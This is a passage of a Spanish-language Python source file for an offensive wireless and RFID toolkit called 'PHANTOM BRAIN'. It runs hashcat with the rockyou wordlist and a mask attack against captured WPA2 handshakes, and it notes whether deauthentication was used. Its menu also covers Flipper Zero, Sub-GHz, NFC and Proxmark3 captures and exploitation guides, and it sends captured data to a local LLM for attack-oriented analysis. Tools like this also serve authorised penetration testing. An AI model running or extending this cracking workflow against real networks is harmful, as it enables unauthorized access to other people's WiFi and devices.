            crackear = input("\n[6] Hash listo. Iniciar crackeo con rockyou.txt ahora? (s/n): ").strip().lower()
            if crackear == "s":
                wordlist = "/home/otto/rockyou.txt"
                if not os.path.exists(wordlist):
                    wordlist = input("    Ruta al wordlist: ").strip()
                print(f"\n    Ejecutando hashcat -m 22000 {archivo_hash} {wordlist}")
                print("    Presiona 's' para ver status, 'q' para salir.\n")
                subprocess.run([
                    "hashcat", "-m", "22000", archivo_hash, wordlist
                ])
        else:
            print("[WARN] No se generaron hashes. Puede que no haya handshake completo.")

    except Exception as e:
        print(f"[WARN] hcxpcapngtool fallo: {e}")

    # --- PASO 9: Parsear para analisis IA ---
    print("\n[7] Analizando captura con IA...")
    try:
        from pcap_parser_v2 import parsear_pcap
        resultado_parse = parsear_pcap(archivo_cap)
        if resultado_parse:
            return resultado_parse, False, "WPA2", None
    except Exception as e:
        print(f"[WARN] Parser automatico fallo: {e}")

    contenido = f"""=== CAPTURA EN VIVO WPA2 ===
ESSID: {objetivo['essid']}
BSSID: {objetivo['bssid']}
Canal: {objetivo['canal']}
Archivo cap: {archivo_cap}
Hash hc22000: {archivo_hash if os.path.exists(archivo_hash) else 'No generado'}
Deauth usado: {'Si' if usar_deauth == 's' else 'No'}
Timestamp: {timestamp2}

Comandos de crackeo:
hashcat -m 22000 {archivo_hash} /home/otto/rockyou.txt
hashcat -m 22000 {archivo_hash} -a 3 ?l?l?l?l?d?d?d?d
"""
    return contenido, False, "WPA2", None


def obtener_input():
    print("\n1. Pegar texto manualmente")
    print("2. Leer archivo generico (scan.txt, nmap, etc)")
    print("3. Leer log de Flipper Zero / Marauder (.log)")
    print("4. Analizar capturas Sub-GHz (.sub)")
    print("5. Analizar capturas NFC (.nfc)")
    print("6. Analizar capturas WPA2 Handshakes (.pcap)")
    print("7. Analizar captura Proxmark3 (pegar output directo)")
    print("8. Ver historial de reportes")
    print("9. Guias de explotacion (sin analisis IA)")
    print("10. Captura en vivo WiFi - Atheros AR9271 (solo Raspberry Pi)")
    opcion = input("\nElegi una opcion (1-10): ").strip()

    if opcion == "1":
        return input("\nPega el output aqui:\n> "), False, "Manual", None

    elif opcion == "2":
        archivo = input("\nNombre del archivo (ej: scan1.txt): ").strip()
        if not os.path.exists(archivo):
            print(f"[ERROR] Archivo '{archivo}' no encontrado.")
            return None, False, "Generico", None
        try:
            with open(archivo, "r", encoding="utf-8") as f:
                contenido = f.read()
            print(f"Archivo '{archivo}' cargado correctamente.")
            return contenido, False, "Generico", None
        except Exception as e:
            print(f"[ERROR] No se pudo leer el archivo: {e}")
            return None, False, "Generico", None

    elif opcion == "3":
        archivo = input("\nNombre del archivo .log (ej: scanap_0.log): ").strip()
        if not os.path.exists(archivo):
            print(f"[ERROR] Archivo '{archivo}' no encontrado.")
            return None, False, "WiFi-Marauder", None
        try:
            with open(archivo, "r", encoding="utf-8") as f:
                contenido = f.read()
            print(f"Log '{archivo}' cargado. Procesando...")
            filtrado = parsear_marauder(contenido)
            print("\n--- PREVIEW DEL FILTRADO ---")
            print(filtrado)
            print("----------------------------\n")
            return filtrado, True, "WiFi-Marauder", None
        except Exception as e:
            print(f"[ERROR] No se pudo leer el archivo de log: {e}")
            return None, False, "WiFi-Marauder", None

    elif opcion == "4":
        print("Cargando capturas Sub-GHz disponibles...")
        contenido = menu_subghz()
        if contenido is None:
            print("Operacion cancelada.")
            sys.exit(0)
        print("\n" + contenido)
        return contenido, False, "Sub-GHz", None

    elif opcion == "5":
        print("Cargando capturas NFC disponibles...")
        contenido = menu_nfc()
        if contenido is None:
            print("Operacion cancelada.")
            sys.exit(0)
        print("\n" + contenido)
        return contenido, False, "NFC", None

    elif opcion == "6":
        print("Cargando capturas WPA2 disponibles...")
        contenido = menu_pcap()
        if contenido is None:
            print("Operacion cancelada.")
            sys.exit(0)
        print("\n" + contenido)
        return contenido, False, "WPA2", None

    elif opcion == "7":
        contenido, datos_pm3 = menu_proxmark()
        if contenido is None:
            print("Operacion cancelada.")
            sys.exit(0)
        return contenido, False, "Proxmark3", datos_pm3

    elif opcion == "8":
        menu_historial()
        sys.exit(0)

    elif opcion == "9":
        if not EXPLOIT_GUIDE_DISPONIBLE:
            print("[ERROR] exploit_guide.py no encontrado en la carpeta del proyecto.")
            sys.exit(1)
        _menu_exploit_guide()
        sys.exit(0)

    elif opcion == "10":
        resultado = menu_captura_vivo()
        if resultado is None:
            print("Operacion cancelada.")
            sys.exit(0)
        return resultado

    else:
        print("Opcion invalida.")
        sys.exit(1)


# --- Guardar reporte ---

def extraer_nivel_riesgo(resultado):
    """Extrae el nivel de riesgo mas alto del analisis de la IA."""
    for nivel in ["CRITICO", "ALTO", "MEDIO", "BAJO"]:
        if nivel in resultado.upper():
            return nivel
    return "DESCONOCIDO"


def guardar_reporte(scan_input, resultado, tipo="Generico", uid_bssid=None, modelo="N/A"):
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    nombre = os.path.join(CARPETA_REPORTES, f"reporte_{timestamp}.txt")
    try:
        with open(nombre, "w", encoding="utf-8") as f:
            f.write("PHANTOM BRAIN - Reporte de Analisis\n")
            f.write(f"Version: {CONFIG.get('proyecto', {}).get('version', '0.7')}\n")
            f.write(f"Fecha: {timestamp}\n")
            f.write(f"Tipo: {tipo}\n")
            f.write(f"Modelo IA: {modelo}\n")
            f.write("=" * 55 + "\n\n")
            f.write("INPUT ANALIZADO:\n")
            f.write(scan_input + "\n\n")
            f.write("ANALISIS:\n")
            f.write(resultado)
        logger.info(f"Reporte guardado: {nombre}")
    except Exception as e:
        logger.error(f"Error al guardar reporte '{nombre}': {e}")
        print(f"[ADVERTENCIA] No se pudo guardar el reporte: {e}")
        nombre = f"reporte_{timestamp}.txt"

    if DB is not None:
        nivel_riesgo = extraer_nivel_riesgo(resultado)
        DB.guardar_reporte(
            tipo=tipo,
            uid_bssid=uid_bssid or "N/A",
            nivel_riesgo=nivel_riesgo,
            modelo_ia=modelo,
            archivo_txt=nombre,
            resumen=resultado
        )

    return nombre


# --- Analizador IA ---

def analizar(scan_input, modelo, tipo_captura="Generico"):
    print(f"\nAnalizando con {modelo}...\n")
    try:
        ia_cfg = CONFIG.get("ia", {})
        num_predict = ia_cfg.get("num_predict", 3000)
        temperatura = ia_cfg.get("temperatura", 0.7)
        timeout = ia_cfg.get("timeout", 180)
        prompt = obtener_prompt(tipo_captura)

        import ollama as _ollama_mod
        client = _ollama_mod.Client(timeout=timeout)

        respuesta_completa = []
        print("", end="", flush=True)
        stream = client.chat(
            model=modelo,
            options={"num_predict": num_predict, "temperature": temperatura},
            messages=[
                {"role": "system", "content": prompt},
                {"role": "user", "content": scan_input}
            ],
            stream=True
        )
        for chunk in stream:
            token = chunk['message']['content']
            print(token, end="", flush=True)
            respuesta_completa.append(token)
        print()  # salto de linea al terminar

        logger.info(f"Analisis completado con modelo: {modelo}, tipo: {tipo_captura}")
        return "".join(respuesta_completa)
    except Exception as e:
        logger.error(f"Error al analizar con Ollama ({modelo}): {e}")
        print(f"\n[ERROR] No se pudo conectar con Ollama o el modelo '{modelo}' no esta disponible.")
        print(f"Detalle: {e}")
        print("\nVerifica que Ollama este corriendo: ollama serve")
        print(f"Y que el modelo este descargado: ollama pull {modelo}")
        raise RuntimeError(f"Ollama no disponible o modelo '{modelo}' no encontrado: {e}") from e


# --- MAIN ---

if __name__ == "__main__":
    mostrar_banner()
    modelo = elegir_modelo()
    try:
        scan_input, es_marauder, tipo_captura, datos_extra = obtener_input()
    except (KeyboardInterrupt, EOFError):
        sys.exit(0)
    if scan_input is None:
        print("[INFO] No se pudo obtener input. Saliendo.")
        sys.exit(1)
    try:
        resultado = analizar(scan_input, modelo, tipo_captura)
    except RuntimeError as e:
        print(f"\n[ERROR] {e}")
        sys.exit(1)
    # resultado ya impreso via streaming
    uid_bssid = None
    if datos_extra and isinstance(datos_extra, dict):
        uid_bssid = datos_extra.get("uid") or datos_extra.get("raw_id")
    nombre_reporte = guardar_reporte(
        scan_input=scan_input,
        resultado=resultado,
        tipo=tipo_captura,
        uid_bssid=uid_bssid,
        modelo=modelo
    )
    print("\n" + "=" * 55)
    print(f"Reporte guardado como: {nombre_reporte}")
    print("=" * 55)
